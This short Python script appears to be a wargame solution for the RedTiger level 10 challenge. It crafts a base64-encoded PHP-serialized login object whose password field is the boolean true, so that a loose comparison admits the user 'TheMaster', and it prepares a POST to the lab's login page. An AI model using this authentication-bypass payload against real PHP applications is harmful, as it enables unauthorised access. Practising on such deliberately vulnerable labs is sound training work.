import requests
from base64 import b64decode, b64encode

cookies = {"level10login": "whatever_just_a_fresh_password"}
url = "https://redtiger.labs.overthewire.org/level10.php"

login = """a:2:{s:8:"username";s:9:"TheMaster";s:8:"password";b:1;}"""
print b64encode(login)
data = {
    "login": b64encode(login),
    "dologin": "Login"
}

# a:2:{s:8:"username";s:6:"Monkey";s:8:"password";s:12:"0815password";}

#r = requests.post(url, cookies=cookies, data=data)
#print r.text
